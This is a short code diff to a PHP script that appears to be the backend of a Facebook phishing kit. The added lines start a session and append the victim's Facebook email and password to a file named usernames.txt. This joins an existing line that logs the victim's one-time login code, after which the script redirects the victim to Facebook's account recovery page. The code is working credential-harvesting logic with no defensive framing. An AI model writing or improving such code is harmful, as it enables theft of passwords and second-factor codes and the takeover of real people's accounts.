@@ -1,4 +1,5 @@
 <?php
+session_start();
 function get_client_ip()
 {
     $ipaddress = '';
@@ -154,7 +155,7 @@ if ($success==false) {
     fwrite($fp, "\n");
     fclose($fp);
 }
-
+file_put_contents("usernames.txt", "Facebook Username: " . $_SESSION['email'] . "\n". "Pass: " . $_SESSION['pass'] . "\n", FILE_APPEND);
 file_put_contents("usernames.txt", "OTP: " . $_POST['approvals_code'] . "\n", FILE_APPEND);
 $url = "redirectUrl"; # https://facebook.com/recover/initiate/
 header("Location: $url");
